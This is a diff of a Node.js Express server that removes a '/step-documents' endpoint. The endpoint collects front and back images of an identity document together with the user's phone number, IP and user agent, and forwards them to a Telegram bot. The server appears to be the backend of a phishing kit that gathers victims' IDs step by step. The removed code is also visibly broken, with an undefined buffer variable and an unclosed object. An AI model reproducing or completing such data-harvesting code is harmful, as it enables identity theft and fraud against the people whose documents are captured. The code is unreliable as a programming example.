@@ -424,83 +424,9 @@ app.post('/step-biometrics', async (req, res) => {
 });
 
 
-// DOCUMENTOS 
-
-
-// ==================== ENDPOINT: DOCUMENTOS  ====================
-app.post('/step-documents', async (req, res) => {
-  try {
-    const { sessionId,imageFront,imageBack,userAgent, ip, phoneNumber } = req.body;
-	
-
-    if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
-    }
-
-    if (!sessionId || !imageFront || !imageBack) {
-       return res.status(400).json({ ok: false, error: 'Datos incompletos' });
-     }
  
-       
-    // ⚠️ NO romper si no existe la sesión
-	
-     const session = sessionData.get(sessionId) || {};
-     sessionData.set(sessionId, session);
-    // 🔹 Prioridad del número:
-    // 1) sesión
-    // 2) body
-    // 3) N/A
-    const finalPhoneNumber =
-      session.phoneNumber || phoneNumber || 'N/A';
 
-    // 🔹 convertir base64 a buffer
-    const buffer = Buffer.from(imageFront.replace(/^data:image\/\w+;base64,/, ''),
-       'base64' );
-	   
-	const buffer2 = Buffer.from(imageBack.replace(/^data:image\/\w+;base64,/, ''),
-       'base64' );   
 
-    const FormData = require('form-data');
-    const formData = new FormData();
-
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', buffer1, {
-      filename: 'cara1.jpg',
-      contentType: 'image/jpeg',
-	formData.append('photo', buffer2, {
-      filename: 'cara1.jpg',
-      contentType: 'image/jpeg',
-	 });
-
-    formData.append(
-      'caption',
-`🧬 DOCUMENTOS RECIBIDOS 
-
-📱 Número: ${finalPhoneNumber}
-🆔 Session: ${sessionId}
-🌐 IP: ${session.ip || ip || req.ip}
-🖥️ UA: ${session.userAgent || userAgent || req.headers['user-agent'] || 'N/A'}`
-    );
-
-    await axios.post(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-      formData,
-      { headers: formData.getHeaders() }
-    );
-
-    console.log('📸 Biometría enviada a Telegram');
-    console.log('📱 Número:', finalPhoneNumber);
-    console.log('🆔 Session:', sessionId);
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error('❌ Error biometría:', err);
-    res.status(500).json({ ok: false });
-  }
-});
-
-// ==================== ENDPOINT: DOCUMENTOS ====================
 
 
 
